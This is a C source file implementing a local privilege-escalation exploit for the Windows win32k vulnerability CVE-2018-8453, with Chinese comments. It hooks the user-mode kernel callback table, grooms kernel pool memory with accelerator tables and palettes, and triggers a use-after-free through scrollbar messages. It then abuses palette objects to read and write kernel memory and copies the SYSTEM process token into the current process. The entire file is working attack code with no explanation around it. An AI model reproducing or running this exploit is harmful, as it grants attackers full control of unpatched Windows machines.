#include "CVE-2018-8453.h"

EXTERN_C ULONG64 NtUserSetWindowFNID(HANDLE, UINT);

BOOL g_Flag_2018_8453 = FALSE;
HWND Window = NULL, ScrollBar = NULL, New_ScrollBar = NULL;
pFunc org_fnDWORD = NULL, org_xxxClientFreeWindowClassExtraBytes = NULL;
ULONG64 g_ulTarAddr_2018_8453 = 0;
ULONG64 g_ulMenuName_2018_8453[0x400];

BOOL Exploit_CVE_2018_8453()
{
	BOOL bRet = TRUE;
	
	HPALETTE hPalette[2] = { NULL };

	if (!Init_CVE_2018_8453(hPalette))
	{
		bRet = FALSE;
		goto exit;
	}

	// 触发漏洞
	g_Flag_2018_8453 = TRUE;
	SendMessage(ScrollBar, WM_LBUTTONDOWN, MK_LBUTTON, 0x008008);

	// 提升权限
	if (!EnablePrivilege_CVE_2018_8453(hPalette[0], hPalette[1]))
	{
		bRet = FALSE;
		goto exit;
	}

	if (!ReapairData_CVE_2018_8453(hPalette[0], hPalette[1]))
	{
		bRet = FALSE;
		goto exit;
	}
	
exit:
	return bRet;
}

BOOL ReapairData_CVE_2018_8453(HPALETTE hManager, HPALETTE hWorker)
{
	BOOL bRet = TRUE;
	ULONG64 ulValue = 0;
	DWORD i = 0;

	DWORD dwEntries = sizeof(ULONG64) / sizeof(PALETTEENTRY);
	DWORD dwFirstColorOffset = 0x78;
	DWORD dwStart = (0x800 - 0x88 + dwFirstColorOffset) / 4;
	for (i = 0; i < 0x400; i++)
	{
		if (g_ulMenuName_2018_8453[i])
		{
			if (!WriteDataByPalette(hManager, hWorker, dwStart, dwEntries, (PVOID)g_ulMenuName_2018_8453[i], (ULONG64)ulValue))
			{
				printf("reapair wrong\n");
				bRet = FALSE;
				goto exit;
			}
		}
		else break;
	}

exit:
	return bRet;
}

BOOL EnablePrivilege_CVE_2018_8453(HPALETTE hManager, HPALETTE hWorker)
{
	BOOL bRet = TRUE;
	DWORD dwEntries = sizeof(ULONG64) / sizeof(PALETTEENTRY);
	DWORD dwFirstColorOffset = 0x78;
	DWORD dwStart = (0x800 - 0x88 + dwFirstColorOffset) / 4;

	// 获取System进程的EPROCESS
	ULONG64 ulSystemEprocess = GetSystemEprocessByPalette(hManager, hWorker, dwStart, dwEntries);
	if (!ulSystemEprocess)
	{
		bRet = FALSE;
		goto exit;
	}
	
	DWORD CONST dwPIDOffset = 0x2E0, dwLinksOffset = 0x2E8, dwTokenOffset = 0x358;
	ULONG64 ulPID = GetCurrentProcessId(), ulCurPID = 0, ulCurEprocess = ulSystemEprocess;
	
	// 获取当前进程EPROCESS
	do {
		ulCurEprocess = ReadDataByPalette(hManager, hWorker, dwStart, dwEntries, (PVOID)(ulCurEprocess + dwLinksOffset));
		ulCurEprocess -= dwLinksOffset;
		ulCurPID = ReadDataByPalette(hManager, hWorker, dwStart, dwEntries, (PVOID)(ulCurEprocess + dwPIDOffset));
	} while (ulPID != ulCurPID);

	ULONG64 ulToken = 0;
	
	// 将system进程的token赋给当前进程
	ulToken = ReadDataByPalette(hManager, hWorker, dwStart, dwEntries, (PVOID)(ulSystemEprocess + dwTokenOffset));
	WriteDataByPalette(hManager, hWorker, dwStart, dwEntries, (PVOID)(ulCurEprocess + dwTokenOffset), ulToken);

exit:
	return bRet;
}

BOOL Init_CVE_2018_8453(HPALETTE *hPalette)
{
	BOOL bRet = TRUE;

	if (!CreateWindows())
	{
		bRet = FALSE;
		goto exit;
	}

	if (!GetPalette_CVE_2018_8453(hPalette))
	{
		bRet = FALSE;
		goto exit;
	}

	if (!HookFunc_CVE_2018_8453())
	{
		bRet = FALSE;
		goto exit;
	}

exit:
	return bRet;
}

BOOL GetPalette_CVE_2018_8453(HPALETTE *hPalette)
{
	BOOL bRet = TRUE;
	CONST DWORD dwCount = 0x1500;
	DWORD i = 0, dwSize = 0x800;
	HACCEL hAccel[dwCount] = { NULL };

	PLOGPALETTE pLogPalette = NULL;

	DWORD dwNumEntries = (dwSize - 0x88 - POOL_HEADER_SIZE - 0x10) / 4;
	DWORD dwPalSize = sizeof(LOGPALETTE) + (dwNumEntries - 1) * sizeof(PALETTEENTRY);

	pLogPalette = (PLOGPALETTE)malloc(dwPalSize);
	if (!pLogPalette)
	{
		ShowError("malloc", GetLastError());
		goto exit;
	}

	ZeroMemory(pLogPalette, dwPalSize);
	memset(pLogPalette, 0x41, dwPalSize);
	pLogPalette->palNumEntries = dwNumEntries;
	pLogPalette->palVersion = 0x300;

	// 消耗0x800大小的空余内存
	for (i = 0; i < dwCount; i++)
	{
		// 0x14D * 6 + 0x1C + 0x10 = 0x7CE + 0x1C + 0x10 = 0x7FA = 0x800
		ACCEL accel[0x14D] = { 0 };
		hAccel[i] = CreateAcceleratorTable(accel, 0x14D);
		if (!hAccel[i]) break;
	}

	// 申请一块新的0x1000大小MENUNAME并释放掉它
	ULONG64 ulRes = AllocateFreeWindow(0x1000);
	if (!ulRes)
	{
		bRet = FALSE;
		goto exit;
	}

	// 占用释放上一步释放的0x1000大小的内存
	hPalette[0] = CreatePalette(pLogPalette);
	hPalette[1] = CreatePalette(pLogPalette);

	if (!hPalette[0] || !hPalette[1])
	{
		bRet = FALSE;
		goto exit;
	}

	// 用于记录修改cEntries成员的大小
	g_ulTarAddr_2018_8453 = ulRes + 0x2D - 8;

exit:
	for (i = 0; i < dwCount; i++)
	{
		if (hAccel[i])
		{
			DestroyAcceleratorTable(hAccel[i]);
			hAccel[i] = NULL;
		}
		else break;
	}
	return bRet;
}

BOOL CreateWindows()
{
	BOOL bRet = TRUE;

	HINSTANCE handle = NULL;

	handle = GetModuleHandle(NULL);
	if (!handle)
	{
		bRet = FALSE;
		ShowError("GetModuleHandle", GetLastError());
		goto exit;
	}

	char *szClassName = "MainWindow";
	WNDCLASS wc = { 0 };

	wc.style = CS_HREDRAW | CS_VREDRAW;
	wc.lpfnWndProc = DefWindowProc;
	wc.hInstance = handle;
	wc.cbWndExtra = 8;
	wc.lpszClassName = szClassName;

	if (!RegisterClass(&wc))
	{
		bRet = FALSE;
		ShowError("RegisterClass", GetLastError());
		goto exit;
	}

	Window = CreateWindowEx(0, szClassName, NULL, WS_DISABLED, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	if (!Window)
	{
		bRet = FALSE;
		ShowError("CreateWindowEx", GetLastError());
		goto exit;
	}

	SetWindowLong(Window, 0, (ULONG)Window);

	ScrollBar = CreateWindowEx(0, "SCROLLBAR", NULL, WS_CHILD | WS_VISIBLE | SBS_HORZ, NULL, NULL, 2, 2, Window, NULL, handle, NULL);
	if (!ScrollBar)
	{
		bRet = FALSE;
		ShowError("CreateWindowEx", GetLastError());
		goto exit;
	}

exit:
	return bRet;
}

BOOL HookFunc_CVE_2018_8453()
{
	BOOL bRet = TRUE;

	ULONG64 ulKernelCallBackTable = *(PULONG64)(GetPEB() + 0x58);

	DWORD dwOldProtect = 0;

	if (!VirtualProtect((PVOID)ulKernelCallBackTable, PAGE_SIZE, PAGE_READWRITE, &dwOldProtect))
	{
		bRet = FALSE;
		ShowError("VirtualProtect", GetLastError());
		goto exit;
	}

	org_fnDWORD = (pFunc)*(PULONG64)(ulKernelCallBackTable + 0x8 * 0x2);
	*(PULONG64)(ulKernelCallBackTable + 0x8 * 0x2) = (ULONG64)My_fnDWORD;

	org_xxxClientFreeWindowClassExtraBytes = (pFunc)*(PULONG64)(ulKernelCallBackTable + 0x8 * 0x7E);
	*(PULONG64)(ulKernelCallBackTable + 0x8 * 0x7E) = (ULONG64)My_xxxCreateFreeWindowClassExtraBytes;

	if (!VirtualProtect((PVOID)ulKernelCallBackTable, PAGE_SIZE, dwOldProtect, &dwOldProtect))
	{
		bRet = FALSE;
		ShowError("VirtualProtect", GetLastError());
		goto exit;
	}

exit:
	return bRet;
}

LONG64 My_fnDWORD(PVOID arg0)
{
	if (g_Flag_2018_8453 && *(PDWORD)arg0)
	{
		g_Flag_2018_8453 = FALSE;
		DestroyWindow(Window);
	}

	if (*((PULONG64)arg0 + 1) == 0x70)
	{
		CONST DWORD dwCount = 0x2000;
		DWORD i = 0, dwSize = 0x80;
		HACCEL hAccel[dwCount] = { NULL };

		// 占用0x80的空闲内存
		for (i = 0; i < dwCount; i++)
		{
			// 0x6 * 0x8 + 0x1C + 0x10 = 0x4E + 0x1C + 0x10 = 0x7A = 0x80
			ACCEL accel[0xD] = { 0 };
			hAccel[i] = CreateAcceleratorTable(accel, 0xD);
			if (!hAccel[i]) break;
		}

		// 释放tagSBTRACK内存
		SendMessage(New_ScrollBar, WM_CANCELMODE, 0, 0);

		lHMValidateHandle HMValidateHandle = (lHMValidateHandle)GetHMValidateHandle();
		if (!HMValidateHandle)	goto exit;

		HINSTANCE handle = GetModuleHandle(NULL);
		if (!handle)
		{
			ShowError("GetModuleHandle", GetLastError());
			goto exit;
		}

		HWND hWnd[0x400] = { NULL };
		WNDCLASSW wc = { 0 };
		WCHAR MenuName[0x100] = { 0 }, ClassName[0x50] = { 0 };

		// 占用释放的tagSBTRACK内存
		memset(MenuName, 0x43, dwSize - sizeof(WCHAR) - POOL_HEADER_SIZE);
		*(PULONG64)((ULONG64)MenuName + 0x8) = g_ulTarAddr_2018_8453;
		*(PULONG64)((ULONG64)MenuName + 0x10) = g_ulTarAddr_2018_8453;

		for (i = 0; i < 0x400; i++)
		{
			memset(ClassName, 0, 0x50);
			sprintf((char*)ClassName, "WindowLeak%d", i);

			memset(&wc, 0, sizeof(wc));
			wc.hInstance = handle;
			wc.lpfnWndProc = DefWindowProc;
			wc.lpszMenuName = MenuName;
			wc.style = CS_HREDRAW | CS_VREDRAW;
			wc.lpszClassName = ClassName;
			if (!RegisterClassW(&wc)) 
			{
				ShowError("RegisterClassW", GetLastError());
				break;
			}

			hWnd[i] = CreateWindowExW(0, (LPCWSTR)ClassName, NULL, WS_DISABLED, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
			if (!hWnd[i])
			{
				ShowError("CreateWindowExW", GetLastError());
				break;
			}
		}

		ULONG64 ulTagCls = 0, ulClientDelta = 0;
		PTHRDESKHEAD pTagWndHead = NULL;
		for (i = 0; i < 0x400; i++)
		{
			if (!hWnd[i]) break;
			pTagWndHead = (PTHRDESKHEAD)HMValidateHandle(hWnd[i], TYPE_WINDOW);
			ulClientDelta = (ULONG64)pTagWndHead->pSelf - (ULONG64)pTagWndHead;
			ulTagCls = *(PULONG64)((ULONG64)pTagWndHead + 0xA8) - ulClientDelta;
			g_ulMenuName_2018_8453[i] = ulTagCls + 0x98 + ulClientDelta;
		}

		for (i = 0; i < dwCount; i++)
		{
			if (hAccel[i])
			{
				DestroyAcceleratorTable(hAccel[i]);
				hAccel[i] = NULL;
			}
			else break;
		}
	}

exit:
	return org_fnDWORD(arg0);
}

LONG64 My_xxxCreateFreeWindowClassExtraBytes(PVOID arg0)
{
	if ((*(HWND*)*(HWND*)arg0) == Window)
	{
		New_ScrollBar = CreateWindowExA(0, "SCROLLBAR", NULL, SBS_HORZ | WS_HSCROLL | WS_VSCROLL, NULL, NULL, 2, 2, NULL, NULL, GetModuleHandleA(0), NULL);
		NtUserSetWindowFNID(Window, 0x2A1);
		SetCapture(New_ScrollBar);
	}

	return org_xxxClientFreeWindowClassExtraBytes(arg0);
}

BOOL POC_CVE_2018_8453()
{
	BOOL bRet = TRUE;

	if (!CreateWindows())
	{
		bRet = FALSE;
		goto exit;
	}

	if (!HookFunc_CVE_2018_8453())
	{
		bRet = FALSE;
		goto exit;
	}

	g_Flag_2018_8453 = TRUE;
	SendMessageA(ScrollBar, WM_LBUTTONDOWN, MK_LBUTTON, 0x00080008);

exit:
	return bRet;
}